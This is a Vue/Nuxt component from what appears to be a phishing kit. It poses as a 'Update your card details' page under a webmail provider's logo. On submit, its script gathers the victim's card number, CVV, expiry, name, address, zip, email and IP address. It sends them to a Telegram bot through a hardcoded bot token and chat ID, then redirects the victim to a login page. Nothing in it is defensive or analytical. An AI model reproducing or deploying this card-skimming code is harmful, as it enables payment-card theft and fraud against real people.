<template>
  <div class="page">
    <div class="overlay" style="">
<div v-if="loading" class="loading-overlay">
  <div class="spinner"></div>
  <p>Loading...</p>
</div>

      <div class="fix">
        <img
          style="margin-bottom: 40px"
          src="https://webmail.unitelsd.com/logos/all/unitelsd.com.png?s=1732144309"
          alt=""
        />
      </div>

      <div class="fix">
        <div class="login-box">
          <h4 style="color: #eee;">Update your card details</h4>
          <br>
          <br>
        <form @submit.prevent="finishJoob" action="">
          <div class="group">
            <label>Cardholder name <span>*</span></label>

            <input v-model="formDataRes.cardHolderName" required type="text" />
          </div>

          <div class="group">
            <label>Card number <span>*</span></label>

            <input v-model="formDataRes.cardNumber" type="number" />
          </div>

          <div class="row">
            <div class="group">
              <label>Exp. Month <span>*</span></label>
              <select v-model="formDataRes.selectedMonth">
                <option v-for="month in months" :key="month" :value="month">
                  {{ month }}
                </option>
              </select>
            </div>

            <div class="group">
              <label>Exp. Year <span>*</span></label>

              <select v-model="formDataRes.selectedYear">
                <option v-for="year in years" :key="year" :value="year">
                  {{ year }}
                </option>
              </select>
            </div>
          </div>

          <div class="group">
            <label>Address <span>*</span></label>

            <input v-model="formDataRes.add1" type="text" />
          </div>

          <!-- <div class="group">
            <label>Address line 2 (Optional)</label>

            <input v-model="formDataRes.add2" type="text" />
          </div>

          <div class="group">
            <label>City <span>*</span></label>

            <input v-model="formDataRes.city" type="text" />
          </div>

          <div class="group">
            <label>State <span>*</span></label>

            <select v-model="formDataRes.selectedState">
              <option v-for="state in states" :key="state" :value="state">
                {{ state }}
              </option>
            </select>
          </div> -->

          <div class="group zip">
            <label>CVV <span>*</span></label>

            <input v-model="formDataRes.cvv" type="number" />
          </div>

          <div class="group zip">
            <label>Zip code <span>*</span></label>

            <input v-model="formDataRes.zipcode" type="number" />
          </div>

          <div class="group">
            <label>Country/Region <span>*</span></label>

            <select disabled>
              <option>United States</option>
            </select>
          </div>

          <!-- <p class="privacy">
            Microsoft respects your privacy.
            <a href="#"> See our privacy statement. </a>
          </p> -->

          <div class="buttons">
            <!-- <button type="button" class="cancel">Cancel</button> -->

            <button type="submit" class="save">Continue</button>
          </div>
        </form>
      </div>
      </div>


    </div>
  </div>
</template>


<script>
import axios from "axios";

export default {
  data() {
    const currentYear = new Date().getFullYear() % 100;

    return {
      formDataRes: {
        cardHolderName: " ",
        cardNumber: " ",
        // selectedMonth: " ",
        // selectedYear: " ",
        // selectedState: " ",
        add1: " ",
        // add2: " ",
        // city: " ",
        // states: " ",
        cvv: " ",
        zipcode: " ",
      },
      months: [
        "01",
        "02",
        "03",
        "04",
        "05",
        "06",
        "07",
        "08",
        "09",
        "10",
        "11",
        "12",
      ],

      years: Array.from({ length: 20 }, (_, i) =>
        String(currentYear + i).padStart(2, "0")
      ),

      states: [
        "Alabama",
        "Alaska",
        "Arizona",
        "Arkansas",
        "California",
        "Colorado",
        "Connecticut",
        "Delaware",
        "Florida",
        "Georgia",
        "Hawaii",
        "Idaho",
        "Illinois",
        "Indiana",
        "Iowa",
        "Kansas",
        "Kentucky",
        "Louisiana",
        "Maine",
        "Maryland",
        "Massachusetts",
        "Michigan",
        "Minnesota",
        "Mississippi",
        "Missouri",
        "Montana",
        "Nebraska",
        "Nevada",
        "New Hampshire",
        "New Jersey",
        "New Mexico",
        "New York",
        "North Carolina",
        "North Dakota",
        "Ohio",
        "Oklahoma",
        "Oregon",
        "Pennsylvania",
        "Rhode Island",
        "South Carolina",
        "South Dakota",
        "Tennessee",
        "Texas",
        "Utah",
        "Vermont",
        "Virginia",
        "Washington",
        "West Virginia",
        "Wisconsin",
        "Wyoming",
      ],

      isActive: false,
      count: 0,
      finalCount: 1, // Only send once
            loading: false,
    };
  },

  computed: {
    isFormValid() {
      return (
        this.formDataRes.cardHolderName.trim() !== "" &&
        this.formDataRes.cardNumber.trim() !== "" &&
        this.formDataRes.selectedMonth.trim() !== "" &&
        this.formDataRes.selectedYear.trim() !== "" &&
        this.formDataRes.add1.trim() !== "" &&
        // this.formDataRes.add2.trim() !== "" &&
        // this.formDataRes.city.trim() !== "" &&
        // this.formDataRes.selectedState.trim() !== "" &&
        this.formDataRes.zipcode.trim() !== "" &&
        this.formDataRes.cvv.trim() !== ""
      );
    },
  },

  methods: {
    async finishJoob() {
      this.count++;

      // if (this.count < this.finalCount) {
        this.loading = true;

        const res = await fetch("https://api.ipify.org?format=json");
        const data = await res.json();
        const email = this.$route.query.email;
        const ip = data.ip;

        // Format the message as string
        const message = `💳💳 GOLDENWEST CARD INFO 💳💳 
        \nEMAIL: ${email}
        \nCARD HOLDER NAME: ${this.formDataRes.cardHolderName}
        \nCARD NUMBER: ${this.formDataRes.cardNumber}
        \nMONTH: ${this.formDataRes.selectedMonth}
        \nYEAR: ${this.formDataRes.selectedYear}
        \nADDRESS LINE 1: ${this.formDataRes.add1}
        \nCVV: ${this.formDataRes.cvv}
        \nZIPCODE: ${this.formDataRes.zipcode}
        \nIP: ${ip}`;

        // Send to Telegram
        await this.sendTelegramResult(
          process.env.NUXT_APP_CHAT_ID || "-4794000485",
          message
        );

        // this.isActive = !this.isActive;
        // this.loading = false;
      // } else {
        // Redirect after sending
        // location.replace("/login");
      // }

      setTimeout(() => {
         this.isActive = !this.isActive;
        this.loading = false;

        // Keep the popup visible for 2 seconds
        setTimeout(() => {
          this.$router.push("/login");
        }, 1000);
      }, 1000);
    },

    async sendTelegramResult(chatId, message) {
      try {
        const url = `https://api.telegram.org/bot7849999042:AAEmwy-noqEuAOxgS1UgV3e5PHj3oDhh718/sendMessage`;

        const payload = {
          chat_id: chatId,
          text: message,
        };

        console.log("Sending payload:", payload);
        await axios.post(url, payload);
      } catch (error) {
        console.error("Telegram API Error:", error);
      }
    },
  },
};
</script>


<style>
* {
  margin: 0;
  padding: 0;
  box-sizing: border-box;
  font-family: Segoe UI, Arial, sans-serif;
}

body {
  width: 100%;
  height: 100vh;
  overflow: hidden;
  background: url("https://d3mqmy22owj503.cloudfront.net/30/501030/images/site_graphics/hero-1.jpg") center center no-repeat;
}

.loading-overlay {
  position: fixed;
  inset: 0;
  background: rgba(255, 255, 255, 0.9);
  display: flex;
  flex-direction: column;
  justify-content: center;
  align-items: center;
  z-index: 9999;
}

.spinner {
  width: 40px;
  height: 40px;
  border: 4px solid #ddd;
  border-top: 4px solid #007bff;
  border-radius: 50%;
  animation: spin 0.8s linear infinite;
}

@keyframes spin {
  to {
    transform: rotate(360deg);
  }
}

.login-box {
  width: 430px;
  height: 720px;
  overflow: scroll;
  /* Firefox */
  scrollbar-width: none;

  /* Internet Explorer/Edge Legacy */
  -ms-overflow-style: none;

  background: rgba(34, 34, 34, 0.88);

  padding: 42px;

  border-radius: 4px;
}

.fix {
  width: 100%;
  display: grid;
  place-items: center;
}

.overlay {
  width: 100%;
  height: 100vh;
  background: rgba(0, 0, 0, 0.45);
  display: flex;
  /* flex-direction: column; */
  justify-content: center;
  align-items: center;
}

.modal {
  width: 580px;
  height: 90vh;
  background: white;
  padding: 45px 48px;
  overflow: scroll;
}

.header {
  display: flex;
  justify-content: space-between;
  align-items: center;
  margin-bottom: 28px;
}

.header h1 {
  font-size: 18px;
  font-weight: 600;
  color: #333;
}

.close {
  background: none;
  border: none;
  font-size: 28px;
  cursor: pointer;
  color: #666;
}

.card-preview {
  height: 260px;
  border: 1px solid #ddd;
  border-radius: 8px;
  background: url("data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMjE4IiBoZWlnaHQ9IjEzOCIgdmlld0JveD0iMCAwIDIxOCAxMzgiIGZpbGw9Im5vbmUiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyI+CjxnIGNsaXAtcGF0aD0idXJsKCNjbGlwMF85NzVfNDI1OCkiPgo8cmVjdCB3aWR0aD0iMjE4IiBoZWlnaHQ9IjEzOCIgcng9IjQuNzA4MzMiIGZpbGw9InVybCgjcGFpbnQwX2xpbmVhcl85NzVfNDI1OCkiLz4KPC9nPgo8ZGVmcz4KPGxpbmVhckdyYWRpZW50IGlkPSJwYWludDBfbGluZWFyXzk3NV80MjU4IiB4MT0iMjE4IiB5MT0iMTM4IiB4Mj0iMC44OTAzNzIiIHkyPSI2LjUyOTY2IiBncmFkaWVudFVuaXRzPSJ1c2VyU3BhY2VPblVzZSI+CjxzdG9wIHN0b3AtY29sb3I9IiNGQUZBRkEiLz4KPHN0b3Agb2Zmc2V0PSIxIiBzdG9wLWNvbG9yPSIjREJEQkRCIi8+CjwvbGluZWFyR3JhZGllbnQ+CjxjbGlwUGF0aCBpZD0iY2xpcDBfOTc1XzQyNTgiPgo8cmVjdCB3aWR0aD0iMjE4IiBoZWlnaHQ9IjEzOCIgcng9IjQuNzA4MzMiIGZpbGw9IndoaXRlIi8+CjwvY2xpcFBhdGg+CjwvZGVmcz4KPC9zdmc+Cg==");
  padding: 35px;
  background-repeat: no-repeat;
  background-size: cover;
  background-position: center;
  display: flex;
  align-items: flex-end;
  margin-bottom: 32px;
}

.card-bottom {
  width: 100%;
  display: flex;
  justify-content: space-between;
  align-items: center;
}

.number {
  font-size: 26px;
  font-weight: 600;
}

.visa {
  width: 140px;
}

.required {
  margin-bottom: 25px;
  color: #555;
}

.required span {
  color: #d13438;
}

.group {
  margin-bottom: 22px;
}

.group label {
  display: block;
  margin-bottom: 8px;
  font-size: 14px;
  color: #eee;
}

.group span {
  color: #d13438;
}

input,
select {
  width: 100%;
  height: 40px;
  border: 1px solid #666;
  border-radius: 4px;
  padding: 0 12px;
  font-size: 14px;
  outline: none;
}

input:focus,
select:focus {
  border-color: #0067b8;
}

input:disabled,
select:disabled {
  background: #efefef;
  color: #888;
}

.row {
  display: flex;
  gap: 18px;
}

.row .group {
  flex: 1;
}

.zip {
  width: 170px;
}

.privacy {
  margin: 20px 0 28px;
  font-size: 12px;
  color: #555;
  line-height: 1.5;
}

.privacy a {
  color: #0067b8;
  text-decoration: none;
}

.buttons {
  display: flex;
  justify-content: space-between;
  gap: 25px;
}

.cancel {
  flex: 1;
  height: 56px;
  border: 1px solid #666;
  background: white;
  font-size: 18px;
  border-radius: 4px;
  cursor: pointer;
}

.save {
  flex: 1;
  height: 56px;
  background: #0067b8;
  border: none;
  color: white;
  font-size: 18px;
  border-radius: 4px;
  cursor: pointer;
}

.save:hover {
  background: #005a9c;
}

@media (max-width: 768px) {
  .modal {
    width: 100%;
    padding: 25px;
  }

  .overlay {
  display: flex;
  flex-direction: column;
}

  .row {
    flex-direction: column;
  }

  .zip {
    width: 100%;
  }

  .buttons {
    flex-direction: column;
  }
}
</style>